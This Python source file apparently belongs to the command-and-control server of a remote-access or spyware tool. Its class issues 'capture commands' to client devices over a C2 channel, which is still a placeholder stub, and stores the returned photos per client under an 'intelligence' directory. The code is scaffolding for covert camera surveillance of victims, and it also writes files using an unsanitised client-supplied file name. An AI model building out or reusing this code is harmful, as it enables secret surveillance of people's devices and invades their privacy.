import os
import time
import logging
from typing import Optional

logger = logging.getLogger(__name__)

class CameraCaptureManager:
    def __init__(self, storage_dir: str = "/intelligence/camera_captures/"):
        self.storage_dir = storage_dir
        os.makedirs(self.storage_dir, exist_ok=True)

    def _generate_filename(self, client_id: str, prefix: str = "photo") -> str:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        return f"{prefix}_{client_id}_{timestamp}.jpg"

    def capture_photo(self, client_id: str, use_flash: bool = False, quality: int = 85) -> bool:
        logger.info(f"Capture command: client={client_id}, flash={use_flash}, quality={quality}")
        # Here you would send the actual command via C2 channel.
        # For now, just a placeholder.
        return True

    def process_received_capture(self, client_id: str, image_data: bytes, original_filename: Optional[str] = None) -> Optional[str]:
        if not image_data:
            logger.error("Empty image data received")
            return None
        filename = original_filename or self._generate_filename(client_id)
        client_dir = os.path.join(self.storage_dir, client_id)
        os.makedirs(client_dir, exist_ok=True)
        file_path = os.path.join(client_dir, filename)
        try:
            with open(file_path, "wb") as f:
                f.write(image_data)
            logger.info(f"Saved capture to {file_path}")
            return file_path
        except Exception as e:
            logger.exception(f"Failed to save capture: {e}")
            return None